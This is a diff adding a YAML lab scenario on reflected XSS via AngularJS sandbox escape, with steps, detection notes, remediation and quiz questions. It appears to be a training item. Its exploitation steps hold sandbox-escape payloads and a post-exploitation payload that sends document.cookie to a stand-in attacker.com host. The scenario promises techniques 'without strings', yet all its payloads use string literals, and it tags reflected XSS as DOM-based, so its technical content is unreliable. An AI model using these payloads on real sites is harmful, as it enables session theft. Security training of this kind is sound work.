@@ -1,0 +1,93 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS with AngularJS sandbox escape without strings"
+id: "xss-angularjs-sandbox-strings-001"
+category: "xss"
+subcategory: "dom_based"
+difficulty: "expert"
+estimated_time: "75 minutes"
+
+description: |
+  This scenario covers reflected XSS in an AngularJS application where the
+  sandbox is present and no strings are allowed. The attacker must use
+  advanced AngularJS sandbox escape techniques using objects like `Object`,
+  `Function`, or `Array` to execute JavaScript without using string literals.
+
+learning_objectives:
+  - Understand AngularJS sandbox and its restrictions
+  - Use object constructors to access Function
+  - Execute JavaScript without string literals
+  - Bypass AngularJS sandbox restrictions
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Advanced understanding of AngularJS and JavaScript
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify AngularJS context and sandbox"
+    commands:
+      - "# Look for AngularJS expressions in the page"
+      - "# Test if strings are blocked or sanitized"
+    expected_output: "AngularJS context identified; strings are blocked"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Use sandbox escape technique without strings"
+    commands:
+      - "# Payload: {{constructor.constructor('alert(1)')()}}"
+      - "# If strings are blocked: {{[].pop.constructor('return alert')().alert(1)}}"
+      - "# Or use Object keys: {{({}).toString.constructor('alert(1)')()}}"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data"
+    commands:
+      - "# Payload: {{[].pop.constructor('return document.location=\"http://attacker.com/steal?cookie=\"+document.cookie')()}}"
+    expected_output: "Cookie sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with complex AngularJS expressions"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Upgrade AngularJS to patched version"
+    - "Avoid using user input in AngularJS expressions"
+  long_term:
+    - "Migrate to Angular (v2+) or React"
+    - "Implement a strict Content Security Policy"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "How does the AngularJS sandbox work and what does it restrict?"
+  - "What are common sandbox escape techniques?"
+  - "Why is it dangerous to use user input in AngularJS expressions?"
+
+references:
+  - url: "https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox"
+    title: "PortSwigger AngularJS Sandbox"
+  - url: "https://docs.angularjs.org/guide/security"
+    title: "AngularJS Security"
